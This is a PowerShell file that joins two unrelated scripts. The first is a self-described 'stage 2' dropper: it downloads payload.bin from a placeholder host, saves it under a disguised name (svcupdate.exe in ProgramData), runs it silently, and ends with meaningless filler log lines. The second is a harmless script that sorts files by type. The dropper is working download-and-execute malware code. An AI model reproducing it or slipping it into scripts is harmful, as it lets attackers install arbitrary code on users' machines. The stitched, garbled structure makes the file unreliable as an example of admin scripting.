<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://contoso.com/payload.bin",
    [string]$DropPath = 'C:\ProgramData\svcupdate.exe',
    [string]$TracePath = "$env:TEMP\report.txt",
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    [int]$ConnectionTimeout = 189,
    [int]$RetryCount = 3,
    [int]$BackoffSeconds = 1
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $TracePath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ""
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$RetryCount = 3,
        [int]$RetryDelay = 1,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $FetchUrl
    $ResultObject = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $DropPath -RetryCount $RetryCount -RetryDelay $BackoffSeconds -UserAgent $RequestAgent
    if ($ResultObject) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath $DropPath -ErrorAction SilentlyContinue
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $FetchUrl
    Destination = $DropPath
    RetryCount = $RetryCount
    TimeoutSec = $ConnectionTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Preparing working directory"
Write-Verbose "Exporting operation report"
Write-Verbose "Resolving configured target"
Write-Verbose "Applying operation timeout"
Write-Verbose "Retry budget remaining"
Write-Verbose "Operation completed"
Write-Verbose "Reading configuration values"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Inspecting process list"
Write-Output "stage 38 initialized"
<#
.SYNOPSIS
    Moves files from a drop folder into per-type destination folders.
.DESCRIPTION
    Reads an extension map, creates the destination folders and moves each file
    into the matching folder without overwriting an existing name.
    The DryRun switch prints the planned moves and leaves the source folder
    untouched, which is the default for the first run on a new machine.
.EXAMPLE
    .\Move-FilesByType.ps1 -SourcePath C:\Users\Public\Documents\Inbox
.NOTES
    Author: Ops Team
    Last updated: 2026-04-14
#>

$SourcePath      = 'C:\Users\Public\Documents\Inbox'
$DestinationRoot = "E:\SortedFiles"
$LogPath         = 'C:\Logs\organise-2026-02-16.log'
$DryRun          = $false

$ProgressPreference = 'SilentlyContinue'

$map = @{
    '.pdf'  = 'Documents'
    '.docx' = 'Documents'
    '.xlsx' = 'Spreadsheets'
    '.png'  = 'Images'
    '.jpg'  = 'Images'
    '.zip'  = 'Archives'
    '.log'  = 'Logs'
}
$files = Get-ChildItem -LiteralPath $SourcePath -File -Force |
    Where-Object { $map.ContainsKey($_.Extension.ToLower()) }
$moved = @()
foreach ($file in $files) {
    $folder = Join-Path $DestinationRoot $map[$file.Extension.ToLower()]
    if (-not (Test-Path -LiteralPath $folder)) {
        New-Item -ItemType Directory -Path $folder -Force | Out-Null
    }
    $target = Join-Path $folder $file.Name
    if (Test-Path -LiteralPath $target) {
        $stamp = Get-Date -Format 'yyyyMMddHHmmss'
        $target = Join-Path $folder ([System.IO.Path]::GetFileNameWithoutExtension($file.Name) + '-' + $stamp + $file.Extension)
    }
    Move-Item -LiteralPath $file.FullName -Destination $target -WhatIf:$DryRun
    $moved += [pscustomobject]@{
        Source  = $file.FullName
        Target  = $target
        MovedAt = Get-Date
    }
}

$byFolder = $moved | Group-Object -Property { Split-Path -Parent $_.Target } |
    Select-Object Name, Count
$byFolder | Format-Table -AutoSize
Write-Host ("Moved {0} files" -f @($moved).Count) -ForegroundColor Green
